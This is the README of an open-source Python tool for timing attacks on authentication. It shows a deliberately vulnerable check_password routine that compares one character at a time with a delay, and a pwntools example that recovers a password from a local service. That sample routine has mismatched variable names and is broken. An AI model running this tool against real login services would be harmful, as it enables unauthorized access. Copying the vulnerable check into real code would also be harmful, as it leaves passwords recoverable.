# Time Authentication Attack Tool

Python Time Based Authentication Attack Tool

## Development

You can contribute by sending merge requests and/or issues on this github opensource project.

## Demo:

[![asciicast](https://asciinema.org/a/126628.png)](https://asciinema.org/a/126628)

## Usage:

### Installation

You can install this package by launching:

```sh
> git clone git@github.com:SakiiR/timeauth.git
[...]
> pip install ./timeauth/
> # Done
```

### Examples

Suppose that we have a listenning tcp service on `localhost:1337` waiting for a password input. 
What if the code behind this TCP service have been done by a weird developer and checks your input char by char
and sleeping each time it checks your char ( or do a BIG action on his server that take some time ).

```sh
> nc localhost 1337
Hello !
password please: SakiiR
Bad Password ! BYE BYE
[!] Closed connection ..
```

And the following backend password verification:

```py
def check_password(input, real):
    if(len(input_flag) == 0):
            return False
        for left, right in zip_longest(input_flag, flag):
            if(left != right):
                return False
            sleep(0.25) # prevent brute forcing
        return True
```

This package has been made to make exploitation of this kind of service faster by implementating a Single Class.

exemple:

```py
from pwn import remote, context
from timeauth import TimeAuthChecker


class ExampleChecker(TimeAuthChecker):

    def __init__(self):
        super(self.__class__, self).__init__(
            charset="0123456789",
            token_length=10,
            hidden_char="*"
        )

    def request(self):

        context.log_level = 'error'
        s = remote('localhost', 1337)
        s.recvuntil(':')
        s.sendline(self.get_token())
        s.readall()
        s.close()
        context.log_level = 'info'

if __name__ == "__main__":
    a = ExampleChecker()
    a.process()
    a.print_token()
```
### Todo

* Add a Time Based SQL Injection Module
* Add a Blind SQL Injection Module

